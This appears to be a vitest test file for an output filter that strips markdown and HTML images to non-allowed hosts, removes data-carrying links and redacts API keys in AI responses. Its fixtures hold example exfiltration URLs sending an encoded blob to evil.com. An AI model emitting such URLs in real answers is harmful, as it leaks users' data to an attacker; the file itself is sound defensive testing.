import { describe, expect, it } from "vitest";
import { checkOutput } from "../src/index.js";

const clean = (text: string, allow: string[] = ["cdn.mycompany.com"]) => checkOutput(text, allow);
const blob = "c2stZGVtby0xMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcA==";

describe("checkOutput", () => {
  it("removes images to sites that aren't allowed, even without data in the URL", () => {
    const r = clean(`Done! ![status](https://evil.com/p.png?d=${blob}) and ![logo](https://evil.com/logo.png)`);
    expect(r.text).toBe("Done! [image removed: status] and [image removed: logo]");
    expect(r.removed).toEqual(["image to evil.com", "image to evil.com"]);
  });

  it("keeps allowed and relative images", () => {
    const text = "![a](https://cdn.mycompany.com/a.png) ![b](/img/b.png) ![c](<https://cdn.mycompany.com/c d.png>)";
    expect(clean(text).text).toBe(text);
  });

  it("handles reference-style and HTML images", () => {
    const r = clean(`See ![chart][1] and <img src="https://evil.com/x.gif">\n\n[1]: https://evil.com/c.png?d=${blob}`);
    expect(r.text).not.toContain("evil.com");
    expect(r.removed).toHaveLength(2);
  });

  it("strips links that carry data but keeps normal links", () => {
    const r = clean(`[docs](https://nodejs.org/docs) and [click](https://evil.com/c?d=${blob})`);
    expect(r.text).toBe("[docs](https://nodejs.org/docs) and click");
  });

  it("hides secrets in the answer", () => {
    expect(clean("your key is sk-abcdefghijklmnopqrstuvwxyz123").text).toBe("your key is [REDACTED]");
  });
});
